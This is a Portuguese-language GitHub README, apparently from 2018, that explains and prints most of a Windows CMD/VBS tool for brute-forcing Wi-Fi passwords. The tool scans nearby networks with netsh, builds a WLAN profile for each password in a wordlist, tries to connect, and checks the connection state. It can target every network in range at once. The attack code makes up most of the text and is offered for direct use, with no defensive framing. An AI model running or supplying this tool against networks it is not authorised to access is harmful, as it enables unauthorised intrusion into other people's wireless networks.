# BruteForce de Wi-fi com CMD ( Prompt de comando do Windows )

---

### Lembrando
**Antes de iniciar o programa, é preciso criar um wordlist.txt no mesmo diretório do programa, a primeira llinha do wordlist deve estar vázia, pois o código pula a primeira linha**

---

Estarei mostrando uma forma de usar o método de Brute Force para Wi-Fi no Windows;
**Resaltando que este Brute Force foi feito no WIndows 10** *(Caso você for testar em uma outra versão, talvez não funcione por conta das "Frases de retorno que contém no código" mas pode ser editado de acordo com o que é retornado :D)* 

### Como usar:
Os arquivos que estão na pasta [Files]('https://github.com/mrhashtagsecurity/bruteforce-wifi-cmd/tree/master/files'), o *`.vbs`* é para criptografar o nome da rede em **hex**, o arquivo *`.cmd`* é o programa em si, e o *`wordlist.txt`* são as senhas ( **Relembrando a primeira linha deve ficar vázia** )

* Ao abrir o programa, ele te dar um aviso que vc deve criar sua Wordlist de possíveis senhas;

* Na proxima tela vai mostrar as redes Wi-Fi disponíveis, você pode escolher "**0**"(zero), para que ele que ele faça um teste em todas as redes disponíveis usando o mesmo wordlist, ou escolher um outro número equivalente a rede que mostra ao lado

```cmd
[0] Todos
[1]SSID 1 : RedeWifi1 - Net
[2]SSID 1 : RedeWifi2 - Net2
...
```

**Depois disso, deixe a mágica acontecer!**

---

### Algumas especificações:
O comando `netsh wlan show networks bssid` verifica todas as redes wi-fi disponíveis 
 ao alcance de seu adaptador de rede wireless

As únicas informações necessárias para mim seria o SSID e o tipo de Autenticação, para isso usei um filtro com o comando **Find** e **Findstr** abaixo:

```cmd
netsh wlan show networks bssid | findstr "SSID Autentica" | findstr /v "BSSID">o
type o | find "SSID" | find /n ":">u
type o | find "Autentica" | find /n ":">i
type u
```
Na sequência usei o Comando **for** foi usado para separar o que eu queria
```cmd
for /f "tokens=1,2* delims=:" %%a in ('find "[%bf%]" u') do (
	for /f "tokens=1* delims= " %%e in ("%%b") do (
		if "%%f" EQU "" (
			set select=%%e
		)else (
			set select=%%e %%f
		)
	)
)

for /f "tokens=1,2 delims=:" %%a in ('find "[%bf%]" i') do (
	
	for /f "tokens=1,2 delims= " %%e in ("%%b") do (
		for /f "tokens=1,2 delims=-" %%m in ("%%e") do (
			set tipo=%%m
		)
	)
)
```
O arquivo Vbs faz toda encriptação para *hex*, e já me retorna todo valor
```vbs
Set Args = Wscript.Arguments
For Each arg In args
	strString = arg
	strHex =""
	For i=1 To Len(strString)
	    strHex = strHex + Hex(Asc(Mid(strString,i,1)))
	Next

	WScript.Echo strHex
Next
```

Agora vem a parte final onde eu adiciono um perfil de rede wireless para poder me conectar;

```cmd
echo ^<?xml version="1.0"?^> >"Wi-Fi-%select%.xml"
echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> >>"Wi-Fi-%select%.xml"
echo 	^<name^>%select%^</name^> >>"Wi-Fi-%select%.xml"
echo 	^<SSIDConfig^> >>"Wi-Fi-%select%.xml"
echo 		^<SSID^> >>"Wi-Fi-%select%.xml"
echo 			^<hex^>%hex%^</hex^> >>"Wi-Fi-%select%.xml"
echo 			^<name^>%Select%^</name^> >>"Wi-Fi-%select%.xml"
echo 		^</SSID^> >>"Wi-Fi-%select%.xml"
echo 	^</SSIDConfig^> >>"Wi-Fi-%select%.xml"
echo 	^<connectionType^>ESS^</connectionType^> >>"Wi-Fi-%select%.xml"
echo 	^<connectionMode^>auto^</connectionMode^> >>"Wi-Fi-%select%.xml"
echo 	^<MSM^> >>"Wi-Fi-%select%.xml"
echo 		^<security^> >>"Wi-Fi-%select%.xml"
echo 			^<authEncryption^> >>"Wi-Fi-%select%.xml"
echo 				^<authentication^>%tipo%PSK^</authentication^> >>"Wi-Fi-%select%.xml"
echo 				^<encryption^>AES^</encryption^> >>"Wi-Fi-%select%.xml"
echo 				^<useOneX^>false^</useOneX^> >>"Wi-Fi-%select%.xml"
echo 			^</authEncryption^> >>"Wi-Fi-%select%.xml"
echo 			^<sharedKey^> >>"Wi-Fi-%select%.xml"
echo 				^<keyType^>passPhrase^</keyType^> >>"Wi-Fi-%select%.xml"
echo 				^<protected^>false^</protected^> >>"Wi-Fi-%select%.xml"
echo 				^<keyMaterial^>%senha%^</keyMaterial^> >>"Wi-Fi-%select%.xml"
echo 			^</sharedKey^> >>"Wi-Fi-%select%.xml"
echo 		^</security^> >>"Wi-Fi-%select%.xml"
echo 	^</MSM^> >>"Wi-Fi-%select%.xml"
echo 	^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^> >>"Wi-Fi-%select%.xml"
echo 		^<enableRandomization^>false^</enableRandomization^> >>"Wi-Fi-%select%.xml"
echo 	^</MacRandomization^> >>"Wi-Fi-%select%.xml"
echo ^</WLANProfile^> >>"Wi-Fi-%select%.xml"
```
Depois disso, faço a conexão, e verifico o status atual de conexão
```cmd
netsh wlan add profile filename="Wi-Fi-%select%.xml">nul
echo.
echo Testando Senha: %senha%
echo Aguade...
ping /n 2 127.0.0.1>nul
netsh wlan connect "%select%">nul
:autenticando
set senhaatual=%senha%
ping /n 5 127.0.0.1>nul
netsh wlan show interfaces | find "Estado">connectStatus
for /f "tokens=1* delims=:" %%d in (connectStatus) do (
	for /f "tokens=1* delims= " %%m in ("%%e") do (
		echo %%m
		if %%m EQU associando (
			echo Quase la... Relaxa....
			goto autenticando
		)
		if %%m EQU Autenticando (
			echo Autenticando...
			if %senhaatual% EQU %senhaanterior% (
				if %all% EQU "True" (
					goto allwifi
				)
				goto nadaencontrado
			)
			goto autenticando
		)
		if %%m EQU Desconectado (
			echo Acesso Negado
			set senhaanterior=%senha%
			if %senhaatual% EQU %senhaanterior% (
				if %all% EQU "True" (
					goto allwifi
				)
				goto nadaencontrado
		)
		if %%m EQU desconectando (
			echo Acesso Negado
			set senhaanterior=%senha%
			if %senhaatual% EQU %senhaanterior% (
				if %all% EQU "True" (
					goto allwifi
				)
				goto nadaencontrado
		)
		)else (
			echo Acesso Permitido
			goto fim
		)
	)
)
```
Meu perfil Facebook: https://www.facebook.com/100001371062730


Autor: Dayvson Vinicius


Data Crição: 18/02/2018